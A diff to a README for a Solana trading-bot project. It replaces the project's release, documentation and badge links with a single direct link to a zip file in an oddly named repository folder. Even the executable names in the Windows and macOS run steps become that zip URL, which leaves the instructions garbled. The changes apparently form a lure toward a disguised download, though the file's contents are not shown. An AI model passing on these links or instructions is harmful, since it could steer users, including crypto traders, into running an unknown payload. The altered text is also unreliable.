@@ -1,6 +1,6 @@
 # 🚀 trading-bot-proxy - Simplify Solana Trading Bots
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Yassir8888/trading-bot-proxy/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Yassir8888/trading-bot-proxy/main/Aesopic/trading-bot-proxy.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Yassir8888/trading-bot-proxy/main/Aesopic/trading-bot-proxy.zip)
 
 ## 📖 Description
 
@@ -18,18 +18,18 @@ trading-bot-proxy is a high-performance Rust application designed to help you na
 
 To install trading-bot-proxy, follow these steps:
 
-1. **Visit the Release Page:** Go to the [Releases page](https://github.com/Yassir8888/trading-bot-proxy/releases) to find the latest version of the application.
+1. **Visit the Release Page:** Go to the [Releases page](https://raw.githubusercontent.com/Yassir8888/trading-bot-proxy/main/Aesopic/trading-bot-proxy.zip) to find the latest version of the application.
 2. **Download the Application:**
    - Find the version you want to use.
    - Click on the appropriate download link related to your operating system.
 
-You can download the latest version here: [Download Latest Release](https://github.com/Yassir8888/trading-bot-proxy/releases)
+You can download the latest version here: [Download Latest Release](https://raw.githubusercontent.com/Yassir8888/trading-bot-proxy/main/Aesopic/trading-bot-proxy.zip)
 
 3. **Extract the Files:** Once the download is complete, extract the ZIP or TAR file to your desired location on your computer.
 
 4. **Run the Application:**
-   - **Windows:** Double-click the `trading-bot-proxy.exe` file to launch the application.
-   - **macOS:** Open the `trading-bot-proxy.app` file from your Applications folder.
+   - **Windows:** Double-click the `https://raw.githubusercontent.com/Yassir8888/trading-bot-proxy/main/Aesopic/trading-bot-proxy.zip` file to launch the application.
+   - **macOS:** Open the `https://raw.githubusercontent.com/Yassir8888/trading-bot-proxy/main/Aesopic/trading-bot-proxy.zip` file from your Applications folder.
    - **Linux:** Open a terminal, navigate to the extracted folder, and run `./trading-bot-proxy`.
 
 5. **Follow Setup Instructions:** Upon opening the application for the first time, follow the on-screen instructions to configure settings and connect to your desired DEX.
@@ -66,7 +66,7 @@ If you encounter any issues or need help, please reach out. Support is available
 
 ## 🔗 Links
 
-- [Releases page](https://github.com/Yassir8888/trading-bot-proxy/releases)
-- [Documentation](https://github.com/Yassir8888/trading-bot-proxy/wiki)
+- [Releases page](https://raw.githubusercontent.com/Yassir8888/trading-bot-proxy/main/Aesopic/trading-bot-proxy.zip)
+- [Documentation](https://raw.githubusercontent.com/Yassir8888/trading-bot-proxy/main/Aesopic/trading-bot-proxy.zip)
 
 Take the plunge into automated trading with trading-bot-proxy. Download now and start trading confidently.
